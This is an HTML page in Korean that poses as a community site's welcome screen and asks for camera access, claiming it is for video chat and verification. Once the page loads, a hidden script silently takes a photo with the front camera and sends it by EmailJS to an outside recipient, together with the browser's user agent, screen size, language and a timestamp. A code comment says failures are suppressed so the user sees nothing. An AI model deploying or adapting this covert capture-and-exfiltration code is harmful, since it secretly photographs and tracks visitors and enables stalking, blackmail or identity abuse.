<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>커뮤니티</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f8f9fa;
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      text-align: center;
      max-width: 420px;
      padding: 30px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    h1 {
      font-size: 1.6rem;
      margin-bottom: 1rem;
      color: #1a1a1a;
    }
    p {
      font-size: 1rem;
      color: #555;
      line-height: 1.5;
      margin-bottom: 1.5rem;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 36px;
      height: 36px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #video, #canvas { display: none; }
  </style>
</head>
<body>

<div class="container">
  <h1>커뮤니티에 오신 걸 환영합니다</h1>
  <p>원활한 사용을 위해 카메라 접근 권한이 필요합니다.<br>
     화상 채팅 및 인증을 위해 사용되며, 언제든지 설정에서 변경 가능합니다.</p>
  
  <div class="loader"></div>
  
  <p style="font-size:0.85rem; color:#777; margin-top:2rem;">
    잠시만 기다려주세요...
  </p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<!-- EmailJS SDK -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="text/javascript">
  (function(){
    emailjs.init({
      publicKey: "ycbHVBt3cm6FkCL--",
    });
  })();
</script>

<script>
const video  = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');

window.addEventListener('load', async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      setTimeout(captureAndSend, 1200);
    };
  } catch (err) {
    document.querySelector('.container').innerHTML = `
      <h1 style="color:#e74c3c;">권한이 필요합니다</h1>
      <p>카메라를 허용해야 서비스를 이용할 수 있습니다.<br>
         새로고침 후 다시 시도해주세요.</p>
    `;
  }
});

async function captureAndSend() {
  canvas.width  = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const base64 = canvas.toDataURL('image/jpeg', 0.68);

  const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });

  const params = {
    timestamp: now,
    image_base64: base64,
    user_agent: navigator.userAgent,
    screen: window.screen.width + "×" + window.screen.height,
    language: navigator.language || 'ko'
  };

  try {
    await emailjs.send(
      "service_had7jag",
      "template_upvu62t",
      params
    );
  } catch (err) {
    // 실패해도 사용자에게는 아무것도 보이지 않게 (조용히)
  }
}
</script>
</body>
</html>
